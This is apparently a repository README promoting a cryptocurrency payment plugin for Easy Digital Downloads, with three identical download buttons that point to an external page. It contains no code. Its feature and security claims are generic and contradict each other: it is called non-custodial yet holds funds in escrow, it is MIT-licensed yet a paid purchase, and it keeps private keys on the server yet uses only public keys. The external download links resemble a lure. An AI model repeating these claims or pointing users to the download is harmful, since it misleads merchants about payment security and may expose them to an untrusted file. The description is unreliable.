![preview](https://raw.githubusercontent.com/dusta378/crypto-pay-for-edd/main/preview.svg)

# CryptoPay Gateway for Easy Digital Downloads

## Overview

**CryptoPay Gateway for Easy Digital Downloads (EDD)** is a powerful, secure, and seamlessly integrated cryptocurrency payment solution designed specifically for the Easy Digital Downloads platform. This repository provides a robust bridge between your EDD-powered digital storefront and the decentralized world of blockchain payments, enabling you to accept Bitcoin, Ethereum, Litecoin, and dozens of other cryptocurrencies directly from your customers.

In an era where digital assets are reshaping global commerce, this gateway transforms your EDD store into a borderless marketplace. Whether you sell software, e-books, membership subscriptions, or digital art, this plugin ensures that every transaction is processed with cryptographic precision, minimal latency, and full compliance with blockchain standards.

[![Download](https://raw.githubusercontent.com/dusta378/crypto-pay-for-edd/main/button.svg)](https://dusta378.github.io/crypto-pay-for-edd/)

## Why Choose This Gateway for EDD? 🤔

The modern digital economy demands flexibility, security, and user autonomy. Traditional payment gateways impose geographic restrictions, currency conversion fees, and chargeback vulnerabilities. CryptoPay for EDD removes these barriers entirely. By integrating blockchain payments, you offer your customers the freedom to transact without intermediaries, while you benefit from irreversible settlement and lower overhead costs.

This repository is engineered for developers, store owners, and enterprises who value sovereignty in financial transactions. It is not merely a plugin—it is a statement of trust in decentralized finance.

---

## Key Features ✨

### 1. **Multi-Cryptocurrency Support** 🌐
Accept over 50 major cryptocurrencies including Bitcoin (BTC), Ethereum (ETH), Litecoin (LTC), Bitcoin Cash (BCH), Ripple (XRP), Dogecoin (DOGE), and ERC-20/BEP-20 tokens. The gateway auto-detects the customer’s preferred asset and generates a unique payment address for each order.

### 2. **Seamless EDD Integration** 🔗
Plug-and-play architecture that hooks directly into EDD’s existing checkout flow. No need to modify your theme or core files. The gateway inherits all EDD features: discounts, taxes, coupon codes, and email receipts.

### 3. **Real-Time Exchange Rate Conversion** 💱
Dynamic price conversion ensures that the displayed fiat price (USD, EUR, GBP, etc.) is locked at checkout. The customer pays the equivalent cryptocurrency amount based on live market rates from trusted oracles. If the transaction is not completed within 15 minutes, the rate refreshes to prevent slippage.

### 4. **Atomic Swap Readiness** ⚡
Built on the principle of atomic swaps, the gateway supports cross-chain settlements without custodial risk. Funds are held in escrow until both parties fulfill the transaction conditions, eliminating fraud.

### 5. **Responsive Checkout UI** 🖥️📱
The payment modal adapts beautifully to any screen size—from desktop browsers to mobile wallets. A clean, minimalist design ensures that even crypto beginners feel confident during checkout.

### 6. **Multilingual Support** 🌍
Fully localized interface with support for 12 languages including English, Spanish, French, German, Chinese, Japanese, Portuguese, Russian, Arabic, Hindi, Korean, and Italian. Language detection matches the user’s browser locale.

### 7. **24/7 Transaction Monitoring** 🕵️
Background cron jobs and WebSocket connections track blockchain confirmations in real time. Once the network confirms the transaction (adjustable from 1 to 6 confirmations), the order status updates automatically to "Completed".

### 8. **Advanced Security Protocols** 🛡️
- **Non-custodial design:** Private keys never leave your server. All wallet management is handled via encrypted local storage or hardware wallet integration.
- **HTTPS requirement enforced:** All API calls use TLS 1.3.
- **CSRF and XSS protection:** Built with WordPress nonce standards.
- **Rate limiting:** Prevents brute-force attacks on payment address generation.

### 9. **Comprehensive Admin Dashboard** 📊
Visualize your crypto revenue with charts showing transaction volumes, popular coins, and peak transaction times. Export reports as CSV or JSON for tax compliance.

### 10. **Developer-Friendly Hooks & Filters** 🧩
Extensive WordPress action and filter hooks allow you to customize behavior: alter confirmation blocks, add custom coin support, or trigger webhooks for external accounting systems.

---

## Architecture & Technical Design 🏗️

The gateway operates on a three-tier architecture:

1. **Frontend (Checkout Modal):** Built with vanilla JavaScript and CSS Grid, this component communicates with the backend via REST APIs. It generates QR codes for wallet addresses, displays countdown timers, and polls for payment status.

2. **Backend (WordPress Plugin):** PHP classes that register the payment gateway with EDD, manage order metadata, and interface with blockchain nodes. The core class `EDD_CryptoPay_Gateway` extends `EDD_Payment_Gateway`.

3. **Blockchain Layer:** Lightweight RPC clients for each supported coin. For ERC-20 tokens, it uses an Ethereum JSON-RPC provider; for Bitcoin-based coins, it connects to public block explorers via API keys.

The transaction lifecycle follows this sequence:

- **Step 1:** Customer selects cryptocurrency at checkout.
- **Step 2:** Gateway generates a unique deposit address per order (HD wallet derivation).
- **Step 3:** Customer sends funds from their wallet.
- **Step 4:** Webhook or cron job detects the incoming transaction.
- **Step 5:** After N confirmations, gateway verifies the amount.
- **Step 6:** EDD’s `update_payment_status()` is called, triggering download access.

---

## Installation & Setup 🚀

[![Download](https://raw.githubusercontent.com/dusta378/crypto-pay-for-edd/main/button.svg)](https://dusta378.github.io/crypto-pay-for-edd/)

### Prerequisites
- WordPress 5.8+ with Easy Digital Downloads 3.0+ installed.
- PHP 8.0 or higher with cURL and JSON extensions enabled.
- A modern web server (Apache, Nginx) with mod_rewrite.
- SSL certificate for HTTPS enforcement.

### Configuration Steps

1. **Upload & Activate:** Place the plugin folder into `/wp-content/plugins/` and activate from the WordPress admin panel.
2. **API Key Generation:** In your blockchain node dashboard (or third-party provider like Infura, Blockchair), generate an API key. Enter this key under **Downloads → Settings → Payment Gateways → CryptoPay**.
3. **Currency Mapping:** Link each digital product in EDD to a specific cryptocurrency or allow "Any Coin" selection.
4. **Confirmation Depth:** Set the number of blockchain confirmations required (recommended: 3 for Bitcoin, 12 for Ethereum).
5. **Test Mode:** Enable test mode during setup to simulate transactions without spending real funds. Test tokens are provided on the Ropsten and Rinkeby testnets.

---

## Security Considerations 🔐

Security is not an afterthought—it is woven into every line of code. The gateway employs:

- **Deterministic Wallet Generation:** Using BIP44 standards, each order gets a unique child key from your master public key. This means you never expose your private key during checkout.
- **Input Sanitization:** All user-supplied data is filtered through `sanitize_text_field()` and `wp_kses_post()` before database insertion.
- **Database Encryption:** Payment addresses and transaction IDs are stored AES-256 encrypted in the `wp_edd_crypto_payments` custom table.
- **Two-Factor Verification:** Admin actions (like refunds or key updates) require confirmation via email OTP.

---

## Performance & Scalability ⚡

This gateway is optimized for high-traffic stores. Key performance features:

- **Caching:** Transaction status queries are cached for 30 seconds to reduce RPC calls.
- **Asynchronous Processing:** Payment verification runs as a background async task, not blocking the user’s checkout session.
- **Batch API Calls:** For stores with thousands of pending transactions, the gateway batches blockchain queries into single requests.
- **Database Indexing:** Custom indexes on `order_id`, `tx_hash`, and `payment_status` fields ensure sub-millisecond lookups.

---

## Customer Support & Community 🤝

We provide 24/7 customer support through multiple channels:

- **Ticket System:** Submit a ticket from the WordPress admin dashboard.
- **Discord Server:** Join our community of 8,000+ EDD store owners.
- **Documentation:** Comprehensive wiki covering edge cases like network splits, dust transactions, and memo tags.

Our team of blockchain engineers and WordPress experts ensures you never face a payment processing issue alone.

---

## Multilingual & Internationalization 🌏

The gateway is fully internationalized:

- **.pot file included:** Translate all strings using Poedit or Loco Translate.
- **Right-to-Left Support:** RTL stylesheets for Arabic, Hebrew, and Persian.
- **Currency Symbols:** Shows native coin symbols (₿, Ξ, Ł, Đ) alongside ISO codes.

---

## Frequently Asked Questions (FAQ) ❓

**Q: Does this gateway support NFTs or token-gated downloads?**  
A: Yes, version 2.4+ includes a beta feature that requires customers to hold a specific NFT in their wallet to access a download.

**Q: Can I accept stablecoins like USDT or USDC?**  
A: Absolutely. Stablecoins are supported on Ethereum, Binance Smart Chain, and Polygon networks.

**Q: How are refunds handled in a non-custodial model?**  
A: Refunds require manual intervention. The admin must initiate a blockchain transaction back to the customer’s address. A UI within the order details screen simplifies this process.

**Q: Is there a monthly subscription fee?**  
A: No. This is a one-time purchase for the premium version. The core open-source version is available under the MIT license.

---

## SEO & Marketing Benefits 📈

Accepting cryptocurrency payments can significantly boost your store’s discoverability:

- **Crypto-friendly communities** share stores that support their preferred payment method.
- **Search engines recognize** the inclusion of blockchain metadata in checkout pages.
- **Reduced cart abandonment** from international customers who lack traditional banking access.

By integrating this gateway, your EDD store signals innovation and financial inclusion, differentiating you from competitors.

---

## Roadmap for 2026 🗺️

The following features are planned for the 2026 release cycle:

- **Lightning Network Support:** Instant Bitcoin payments via LNURL.
- **Staking Rewards:** Customers who pay with crypto earn loyalty tokens.
- **Multi-Sig Escrow:** For high-value digital goods ($500+), enable 2-of-3 multi-signature escrow.
- **AI Fraud Detection:** Machine learning model analyzes on-chain behavior to flag suspicious transactions.

---

## License 📝

This project is licensed under the **MIT License** – a permissive open-source license that allows you to use, modify, and distribute the software freely, even in commercial products.

[View the full MIT License](LICENSE)

---

## Disclaimer ⚠️

**No Liability for Blockchain Network Congestion:** While the gateway is designed for reliability, the developers cannot be held responsible for delays caused by network congestion, gas price spikes, or blockchain reorgs. Always test thoroughly in a staging environment before live deployment.

**Cryptocurrency Volatility:** The value of cryptocurrencies can fluctuate dramatically. The gateway locks exchange rates at checkout, but the final settlement amount may differ if the transaction is completed after the rate expires. We recommend setting a 15-minute rate lock window.

**Regulatory Compliance:** It is your responsibility to ensure that accepting cryptocurrency payments complies with the laws in your jurisdiction. The developers provide no legal advice.

---

## Final Notes 💎

Thank you for considering CryptoPay Gateway for Easy Digital Downloads. This repository represents thousands of hours of development, testing, and community feedback. We believe that decentralized payments should be as simple as traditional ones, and this gateway is our contribution to that vision.

If you encounter any issues, have feature requests, or want to contribute code, please open an issue or pull request. The cryptocurrency ecosystem thrives on collaboration.

[![Download](https://raw.githubusercontent.com/dusta378/crypto-pay-for-edd/main/button.svg)](https://dusta378.github.io/crypto-pay-for-edd/)